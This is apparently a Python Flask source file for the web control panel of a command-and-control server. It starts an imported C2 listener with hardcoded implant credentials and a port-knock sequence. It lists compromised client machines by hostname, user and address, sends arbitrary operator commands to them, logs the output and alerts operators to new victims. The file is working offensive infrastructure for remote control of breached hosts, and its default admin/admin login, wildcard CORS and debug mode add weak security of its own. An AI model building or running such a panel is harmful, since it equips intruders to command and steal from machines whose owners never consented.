# app.py - Flask web application for C2 server management
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_socketio import SocketIO, emit, join_room, leave_room
import threading
import time
import uuid
import os
import logging
import json
from datetime import datetime
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash
from port_knock import PortKnockHandler
# Import the C2Server class from your existing code
# Assuming the file is named c2_server.py
from test import C2Server

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('C2WebInterface')

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*")

# Global variables
operators = {
    "admin": {
        "password_hash": generate_password_hash("admin"),  # Change this default password!
        "role": "admin"
    }
}

# Command history storage - stores commands and responses for each client
command_history = {}

# Create an instance of C2Server (assuming it needs to be modified to work with this interface)
c2_server_config = {
    'bind_address': '0.0.0.0',
    'port': 2222,
    'host_key': 'fren',
    'username': 'implant',
    'password': 'implant',
    'knock_sequence': [10000, 10001, 10002]
}

# Create and start C2 server in a separate thread
c2_server = C2Server(c2_server_config)
server_thread = threading.Thread(target=c2_server.start)
server_thread.daemon = True
server_thread.start()

# Store active web sessions
web_sessions = {}

# Authentication decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'operator_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Operator authentication decorator
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'operator_id' not in session:
            return redirect(url_for('login'))
        
        operator_id = session['operator_id']
        if operator_id not in operators or operators[operator_id]['role'] != 'admin':
            return jsonify({"error": "Admin privileges required"}), 403
            
        return f(*args, **kwargs)
    return decorated_function

# Routes
@app.route('/')
def index():
    if 'operator_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.json
        username = data.get('username')
        password = data.get('password')
        
        if username in operators and check_password_hash(operators[username]['password_hash'], password):
            session['operator_id'] = username
            session_id = str(uuid.uuid4())
            web_sessions[session_id] = {
                'operator_id': username,
                'login_time': datetime.now(),
                'last_activity': datetime.now()
            }
            return jsonify({"success": True, "session_id": session_id})
        
        return jsonify({"success": False, "error": "Invalid credentials"}), 401
    
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html', operator=session['operator_id'])

@app.route('/logout')
def logout():
    if 'operator_id' in session:
        session.pop('operator_id', None)
    return redirect(url_for('login'))

# API endpoints for C2 operations
@app.route('/api/clients', methods=['GET'])
@login_required
def get_clients():
    clients = []
    for i, (client_id, client) in enumerate(c2_server.clients.items()):
        if client.is_active:
            clients.append({
                'id': i,
                'client_id': client_id,
                'hostname': client.hostname,
                'username': client.username,
                'address': f"{client.addr[0]}:{client.addr[1]}",
                'is_current': client_id == c2_server.current_client_id
            })
    
    return jsonify({"clients": clients})

@app.route('/api/clients/<int:client_index>/select', methods=['POST'])
@login_required
def select_client(client_index):
    if c2_server.switch_client(client_index):
        return jsonify({"success": True})
    return jsonify({"success": False, "error": "Invalid client index"}), 400

@app.route('/api/command', methods=['POST'])
@login_required
def execute_command():
    data = request.json
    command = data.get('command')
    client_index = data.get('client_index')
    
    if client_index is not None:
        c2_server.switch_client(client_index)
    
    if not command:
        return jsonify({"success": False, "error": "No command provided"}), 400
    
    # Record who executed this command
    operator_id = session['operator_id']
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        # Execute the command
        response = c2_server.send_command(command)
        
        # Store in command history
        if c2_server.current_client_id:
            if c2_server.current_client_id not in command_history:
                command_history[c2_server.current_client_id] = []
                
            command_history[c2_server.current_client_id].append({
                'timestamp': timestamp,
                'operator': operator_id,
                'command': command,
                'response': response
            })
            
            # Broadcast to all operators viewing this client
            socketio.emit('command_executed', {
                'client_id': c2_server.current_client_id,
                'timestamp': timestamp,
                'operator': operator_id,
                'command': command,
                'response': response
            }, room=f"client_{c2_server.current_client_id}")
            
        return jsonify({
            "success": True,
            "command": command,
            "response": response,
            "timestamp": timestamp,
            "operator": operator_id
        })
        
    except Exception as e:
        logger.error(f"Error executing command: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/history/<client_id>', methods=['GET'])
@login_required
def get_command_history(client_id):
    if client_id in command_history:
        return jsonify({"history": command_history[client_id]})
    return jsonify({"history": []})

@app.route('/api/operators', methods=['GET'])
@admin_required
def get_operators():
    operator_list = []
    for username, data in operators.items():
        operator_list.append({
            'username': username,
            'role': data['role']
        })
    return jsonify({"operators": operator_list})

@app.route('/api/operators', methods=['POST'])
@admin_required
def add_operator():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    role = data.get('role', 'operator')
    
    if not username or not password:
        return jsonify({"success": False, "error": "Username and password are required"}), 400
        
    if username in operators:
        return jsonify({"success": False, "error": "Operator already exists"}), 409
        
    operators[username] = {
        'password_hash': generate_password_hash(password),
        'role': role
    }
    
    return jsonify({"success": True, "username": username, "role": role})

@app.route('/api/operators/<username>', methods=['DELETE'])
@admin_required
def delete_operator(username):
    if username == 'admin':
        return jsonify({"success": False, "error": "Cannot delete admin account"}), 403
        
    if username in operators:
        del operators[username]
        return jsonify({"success": True})
        
    return jsonify({"success": False, "error": "Operator not found"}), 404

# Socket.IO events
@socketio.on('connect')
def handle_connect():
    if 'operator_id' not in session:
        return False
    logger.info(f"Operator connected: {session['operator_id']}")

@socketio.on('join_client_room')
def on_join(data):
    client_id = data['client_id']
    room = f"client_{client_id}"
    join_room(room)
    logger.info(f"Operator {session['operator_id']} joined room {room}")

@socketio.on('leave_client_room')
def on_leave(data):
    client_id = data['client_id']
    room = f"client_{client_id}"
    leave_room(room)
    logger.info(f"Operator {session['operator_id']} left room {room}")

# Update C2Server class to handle new client notifications
def notify_new_client(client):
    socketio.emit('new_client', {
        'hostname': client.hostname,
        'username': client.username,
        'address': f"{client.addr[0]}:{client.addr[1]}"
    })

# Add this function to your C2Server class
c2_server.notify_new_client = notify_new_client

if __name__ == '__main__':
    # Start the Flask app with Socket.IO
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, use_reloader=False)